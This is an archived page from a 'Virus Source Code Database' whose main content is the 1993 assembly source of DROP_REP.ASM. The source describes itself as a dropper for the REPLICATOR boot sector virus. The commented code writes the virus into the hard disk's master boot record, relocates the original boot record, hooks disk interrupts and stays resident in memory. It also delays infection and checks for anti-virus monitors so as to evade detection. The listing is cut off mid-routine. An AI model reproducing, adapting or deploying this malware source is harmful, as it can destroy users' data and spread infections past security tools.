<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: drop_rep_asm</title>
<meta name="KEYWORDS" content="drop_rep.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for drop_rep.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;**********************************************************************************************
;*                                                                                            *
;*  FILE:     DROP_REP.ASM (c) 1993                                                           *
;*  PURPOSE:  Dropper containing REPLICATOR boot sector virus                                 *
;*  AUTHOR:   Willoughby    DATE: 04/19/93                                                    *
;*                                                                                            *
;**********************************************************************************************
;
;------------------------------------------ EQUATES -------------------------------------------
;
AT_TAG                  EQU     0FC
BAD_TAG                 EQU     0BAD
BIOS13_OFFSET           EQU     004C
BIOS13_SEGMENT          EQU     004E
BIOS40_SEGMENT          EQU     0103
BPB_NUM_SECT            EQU     013
CLEAR                   EQU     00
INF_TAG1                EQU     0ABCD
INF_TAG2                EQU     0CDEF
MEM_SIZE                EQU     0413
MOTOR_ON                EQU     043F
PARTITION_OFFSET        EQU     01BE
ROM_SEGMENT             EQU     0F0
SET                     EQU     0BB
SYS_ID_OFFSET           EQU     0FFFE
SYS_ID_SEGMENT          EQU     0F000
;
;---------------------------------------- MAIN PROGRAM ----------------------------------------
;
CODE    SEGMENT
;
;----------------------------
;Dropper for REPLICATOR virus
;----------------------------
; 
DROPPER: 
;                                                                  
;Check system type to determine if the INT1Ah read-real-time-clock function is supported (AT 
;or better).  If not, skip the trigger date check/storage process and store "BAD" tag for 
;the benefit of the REPLICATOR infection analysis program (a future release).  
;
        MOV AX,SYS_ID_SEGMENT           
        MOV DS,AX                               ;Set DS to ROM segment.
        CMP B[SYS_ID_OFFSET],AT_TAG             ;Check system ID byte for AT system tag.
        PUSH CS
        POP DS                                  ;Set DS to dropper code segment.
        JE >D1                                  ;If AT, check date and store before infection.
        MOV DROP_MODAY,BAD_TAG                  ;If not, store hard drive drop date "BAD" tag
                                                ;in VIRUS_DIR. 
        JMP >D3                                 ;Then continue infection process.
;                                            
;Determine if date is equal to or greater than preselected infection date.  This allows the 
;dropper program to pass initial anti-viral scanning/activity monitoring by remaining dormant 
;until a later date.  Also, store month, day and year of pending fixed disk infection in 
;VIRUS_DIR. 
;
D1:
        MOV AH,04                               ;Set read-date function.                   
        INT 01A                                 ;BIOS read-clock interrupt.                 
        MOV DROP_YEAR,CX                        ;Store infection year in VIRUS_DIR.
        MOV DROP_MODAY,DX                       ;Store month and day in VIRUS_DIR.
        CMP CX,01993                            ;Compare system year with 1993 trigger year
                                                ;(CH=century, CL=year, both in BCD).
        JA >D2                                  ;If year>trigger year, proceed w/infection.
        JB >D5                                  ;If year<trigger year, exit and do not infect.
        CMP DX,0101                             ;Compare system date w/Jan. 1st (DH=month, 
                                                ;DL=day, both in BCD).  The date Jan. 1
                                                ;effectively disables this function.
        JB >D5                                  ;If the current date is not => the trigger 
                                                ;date, don't infect.            
;
;Store time of pending fixed disk infection in VIRUS_DIR.
;
D2:
        MOV AH,02                               ;Select read-time function.
        INT 01A                                 ;BIOS read-clock interrupt.
        MOV DROP_TIME,CX                        ;Store infection hour and minute in VIRUS_DIR.
;
;Determine if an anti-viral program is monitoring viral activity via INT40h.  If so, don't 
;infect.   
;
D3:
        PUSH DS                                 ;Preserve DS.                   
        XOR AX,AX
        MOV DS,AX                               ;Zero DS to point to BIOS data table.
        CMP B[BIOS40_SEGMENT],ROM_SEGMENT       ;Has INT40h been stolen from BIOS ROM by an
                                                ;anti-virus program?
        POP DS                                  ;Restore DS.                     
        JB >D5                                  ;If INT40h has been stolen, do not attempt
                                                ;infection. 
;
;Load MBR.
;
        PUSH CS                                                               
        POP ES                                  ;Set ES to dropper code segment.             
        MOV AX,0201                             ;Select read-1-sector function.               
        MOV BX,MBR_BUFFER                       ;Set disk I/O buffer offset.               
        MOV CX,0001                             ;Track 0, sector 1.                        
        MOV DX,0080                             ;Head 0, fixed disk 1.                     
        INT 013                                 ;Read MBR.                                  
        JB >D5                                  ;Exit if flag=failure.                  
;
;Check MBR for infection.
;
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1      ;Check for VIRUS_BOOT infection tag.
        JE >D5                                          ;If infected then exit.
;
;Check fixed disk for an unused first track (head 0, cylinder 0) to avoid damaging any FAT 
;which might be present in that area.  This is accomplished by checking the partition table 
;value which holds the number of the starting head of the first partition.  If this number is 
;equal to or greater than 01, the first track is not in use.
;
        CMP B[BX+PARTITION_OFFSET+1],01         ;Check for unused track on fixed disk by
                                                ;checking partition table data.
        JB >D5                                  ;If in use, exit to avoid damage to FAT.    
;
;Increment hard disk infection counter for pending infection.
;
        INC W[OFFSET HARD_COUNT]
;
;Write original MBR to its new location.  Also, determine if VIRUS_DIR is present on the fixed 
;disk.  If so, don't write VIRUS_DIR to disk so that the previous infection counts and dates 
;are retained.  
;
        MOV AX,0201                                     ;Select read-1-sector function.      
        MOV BX,MBR_BUFFER+0200                          ;Set disk I/O buffer offset.       
        MOV CL,09                                       ;Track 0, sector 9.    
        INT 013                                         ;Read VIRUS_DIR sector.
        JB >D5                                          ;Exit if flag=failure.
        CMP W[BX+OFFSET INFECT_TAG2-0400],INF_TAG2      ;Check for VIRUS_DIR infection tag.
        MOV AX,0302                                     ;Select write-2-sectors function.  
        MOV BX,VIRUS_DIR                                ;Specify VIRUS_DIR buffer offset.
        JNE >D4                                         ;If VIRUS_DIR is not present, write
                                                        ;both VIRUS_DIR and MBR.
        MOV AX,0301                                     ;If present, select write-1-sector
                                                        ;function.
        MOV BX,MBR_BUFFER                               ;Specify MBR buffer address.
        MOV CL,0A                                       ;Specify relocation sector for MBR. 
D4:
        INT 013                                         ;Write to specified sector(s).
        JB >D5                                          ;Exit if flag=failure.             
;
;Copy partition table data to virus.
;
        MOV SI,MBR_BUFFER+PARTITION_OFFSET      ;Set source offset.             
        MOV DI,VIRUS_BOOT+PARTITION_OFFSET      ;Set destination offset.        
        MOV CL,021                              ;Set repetition count (number of words) for
                                                ;partition table move.          
        CLD                                     ;Clear direction flag (fwd).   
        REP MOVSW                               ;Move partition table to virus.   
;
;Write virus to MBR.
;
        MOV AX,0301                             ;Select write-1-sector function.         
        MOV BX,VIRUS_BOOT                       ;Set disk I/O buffer offset.            
        MOV CL,01                               ;Track 0, sector 1.                     
        INT 013                                 ;Write virus with attached partition table
                                                ;to MBR.  
;
;Terminate dropper.
;
D5:
        MOV AX,04C00                            ;Select terminate w/return code function. 
        INT 021                                 ;Terminate dropper.
;
        DB  86  DUP 00                          ;Pad bytes to avoid possible DMA I/O errors.
;
;**********************************************************************************************
;*                                                                                            *
;*  REPLICATOR boot sector virus                                                              *
;*                                                                                            *
;**********************************************************************************************
;
VIRUS_BOOT:
;
        JMP >B1                                 ;Jump over BPB data to virus entry point.     
;
BPB_START:
;
        DB  60 DUP 00                           ;Reserve space for diskette BPB data.
;
BPB_END:
;
;------------
;Boot routine
;------------
;
;Set location of stack.
;
B1:                                    
        XOR AX,AX                               ;Zero AX.                              
        MOV DS,AX                               ;Zero DS.                  
        CLI                                     ;Disable interrupts.                  
        MOV SS,AX                               ;Zero SS.                 
        MOV AX,07C00                            ;Load location of stack to AX.          
        MOV SP,AX                               ;Set SP=7C00h.                 
        STI                                     ;Enable interrupts.                    
        PUSH DS                                 ;Store return address of boot record to be
        PUSH AX                                 ;popped from the stack when VIRUS_BOOT
                                                ;returns to it (0000:7C00h).
;
;Read INT13h segment and offset from BIOS data table and store within VIRUS_BOOT.
;
        MOV AX,W[BIOS13_OFFSET]                 ;Load BIOS INT13h vector offset stored at
                                                ;0000:004Ch.   
        MOV W[OFFSET BIOS_OFFSET+07A00],AX      ;Store BIOS INT13h offset value in virus data 
                                                ;area.     
        MOV CL,06                               ;Set CL for virus segment shift. Location of  
                                                ;this operation chosen to defeat anti-viral
                                                ;generic code-segment scans.
        MOV AX,W[BIOS13_SEGMENT]                ;Load BIOS INT13h vector segment stored at
                                                ;0000:004Eh.  
        MOV W[OFFSET BIOS_SEGMENT+07A00],AX     ;Store BIOS INT13h segment value in virus data
                                                ;area.    
;
;Calculate virus upper memory segment value and store within VIRUS_BOOT.
;
        MOV BX,MEM_SIZE                         ;Load BX with address 0413h. This defeats
                                                ;anti-viral searches for 0413h MOV operations.  
        MOV AX,W[BX]                            ;Load memory size (in KB) stored at 0000:0413h.
        DEC AX                                  ;Calculate value for 2KB reduction of
        DEC AX                                  ;conventional memory.        
        SHL AX,CL                               ;Calculate virus segment.      
        MOV W[OFFSET REENTRY_SEGMENT+07A00],AX  ;Store virus segment value in virus data area.  
        MOV ES,AX                               ;Store in ES to be used to move virus to top of
                                                ;conventional memory.
;
;Move VIRUS_BOOT from 0000:7C00h to top of memory - 2KB.
;
        MOV SI,07C00                            ;Set source offset address for virus move.     
        XOR DI,DI                               ;Set destination offset address to 0000h.       
        MOV CX,0100                             ;Set repetition count (number of words) for
                                                ;move. 
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSW                               ;Move virus from DS:7C00h to ES:0000h.         
        CS JMP D[OFFSET REENTRY_OFFSET+07A00]   ;Jump to self in new location via stored
                                                ;address.         
;
;Load VIRUS_DIR and original boot sector/MBR to top of memory - 1.5KB.
;
NEW_LOCATION:
;
        PUSH CS                                                                
        POP DS                                  ;Set DS=CS.                            
        MOV AX,0202                             ;Select read-2-sectors function.        
        MOV BX,0200                             ;Set disk I/O buffer offset.        
        MOV CL,B[OFFSET SECTOR-0200]            ;VIRUS_DIR sector determined by value stored in
                                                ;VIRUS_BOOT.
        CMP CL,09                               ;Test for hard drive (HD) boot.         
        JE >B2                                  ;Yes, booted from HD.                 
        INC DH                                  ;Select head 1, floppy drive DL.       
B2:                                                                         
        INT 013                                 ;Read VIRUS_DIR and original boot record.
        JNB >B3                                 ;Continue if flag=success.
        JMP B5                                  ;Exit if flag=failure.
;
;Copy original boot sector/MBR down to 0000:7C00h for later execution.     
;
B3:
        XOR AX,AX                               ;Zero AX.                             
        MOV ES,AX                               ;Zero ES (destination segment value).         
        MOV SI,0400                             ;Set source offset address for virus move.    
        MOV DI,07C00                            ;Set destination offset address for move.     
        MOV CX,0100                             ;Set repetition count (# of words) for move.
        CLD                                     ;Clear direction flag (fwd).          
        REP MOVSW                               ;Copy original boot record to 0000:7C00h.     
;
;Determine if the virus is already installed on the system in the memory above.  If it is, in
;order to prevent multiple installations of the virus in memory and the problems that this can
;cause, the virus will be removed from memory.  This will be done by restoring the BIOS data
;table values that it has changed to their original, pre-infection values. 
;
        CMP W[OFFSET INFECT_TAG1+0600],INF_TAG1 ;Check for presence of virus above us.
        JNE >B4                                 ;If it's not there, exit removal routine.
        MOV AX,W[OFFSET BIOS_OFFSET+0600]       ;Get the pre-infection INT13h offset value from
                                                ;the virus installed in memory.
        PUSH AX                                 ;Save that value on the stack.
        MOV AX,W[OFFSET BIOS_SEGMENT+0600]      ;Get the pre-infection INT13h segment value.
        PUSH DS                                 ;Preserve DS.
        XOR BX,BX                               ;Zero BX.
        MOV DS,BX                               ;Zero DS.
        MOV W[BIOS13_SEGMENT],AX                ;Restore BIOS data table to pre-infection
                                                ;segment value.
        POP AX                                  ;Pop pre-infection offset value from stack.
        MOV W[BIOS13_OFFSET],AX                 ;Restore BIOS data table to pre-infection
                                                ;offset value.
        MOV BX,MEM_SIZE                         ;Move data table address for conventional
                                                ;memory size into BX.
